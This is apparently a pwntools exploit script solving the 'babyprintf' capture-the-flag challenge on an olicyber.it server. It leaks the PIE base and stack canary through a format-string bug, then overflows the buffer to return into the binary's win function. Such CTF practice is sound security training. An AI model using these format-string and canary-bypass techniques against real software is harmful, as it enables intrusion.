from pwn import *

exe = ELF("./babyprintf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

HOST = "baby-printf.challs.olicyber.it"
PORT = 34004

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def leak_base(r):
    r.sendlineafter(b"back:", b"%p " * 31)
    r.recvline()
    line = r.recvline().decode().split()
    
    exe.address = int(line[20][2:], 16) - 0x12e4
    log.success(f"LEAKED PIE BASE: {hex(exe.address)}")

    canary = int(line[30][2:], 16)
    log.success(f"LEAKED CANARY: {hex(canary)}")

    return canary
    
def ret2win(r, canary):
    r.sendline(b"!q" * 20 + pack(canary) + b"a" * 8 + pack(exe.symbols.win))
    
def main():
    r = conn()

    canary = leak_base(r)
    ret2win(r, canary)
    
    r.interactive()

if __name__ == "__main__":
    main()
